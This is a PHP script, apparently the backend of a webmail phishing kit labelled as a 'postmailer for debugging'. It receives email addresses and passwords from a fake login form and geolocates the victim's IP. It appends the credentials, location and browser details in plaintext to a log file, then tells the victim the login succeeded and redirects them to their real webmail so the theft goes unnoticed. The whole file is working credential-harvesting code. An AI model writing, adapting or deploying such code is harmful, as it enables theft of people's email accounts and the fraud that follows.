<?php
// Simple version of postmailer for debugging
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit(0);
}

// Start session
session_start();

// Handle GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo json_encode(array(
        'signal' => 'error',
        'msg' => 'GET requests not allowed'
    ));
    exit;
}

// Get client information
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

// Get form data
$login = isset($_POST['email']) ? trim($_POST['email']) : '';
$passwd = isset($_POST['password']) ? $_POST['password'] : '';

// Basic validation
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        'signal' => 'error',
        'msg' => 'Email and password are required'
    ));
    exit;
}

// Validate email format
if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(array(
        'signal' => 'error',
        'msg' => 'Invalid email format'
    ));
    exit;
}

// Extract domain from email
$parts = explode("@", $login);
$domain = isset($parts[1]) ? $parts[1] : 'unknown.tld';

// Try to get location data
$ipdat = null;
try {
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
} catch (Exception $e) {
    // Location lookup failed, continue without it
}

// Prepare message content
$country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
$city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';

$message = "Email: $login\n";
$message .= "Password: $passwd\n";
$message .= "IP: $ip\n";
$message .= "Country: $country\n";
$message .= "City: $city\n";
$message .= "Browser: $browser\n";
$message .= "Domain: $domain\n";
$message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";

// Log to file
$logMessage = "[" . date('Y-m-d H:i:s') . "] " . $message . "\n" . str_repeat("-", 50) . "\n";
$fp = fopen("SS-Or.txt", "a");
if ($fp) {
    fputs($fp, $logMessage);
    fclose($fp);
}

// Try to test credentials (simplified version)
$validCredentials = false;

// For now, let's simulate a credential test
// In a real scenario, you would test against the actual SMTP server
if (strlen($passwd) >= 6) {
    // Simple validation - password length check
    $validCredentials = true;
}

if ($validCredentials) {
    // Valid credentials
    $subg = "TrueRcubeOrange || $country || $login";
    
    echo json_encode(array(
        'signal' => 'ok',
        'msg' => 'Login successful! Redirecting to your mailbox...',
        'success' => true,
        'redirect_url' => 'https://webmail.' . $domain
    ));
} else {
    // Invalid credentials
    $subg2 = "notVerifiedRcudeOrange || $country || $login";
    
    echo json_encode(array(
        'signal' => 'not ok',
        'msg' => 'Invalid email or password. Please check your credentials and try again.',
        'success' => false
    ));
}

// Generate random identifier
$praga = md5(rand());
?>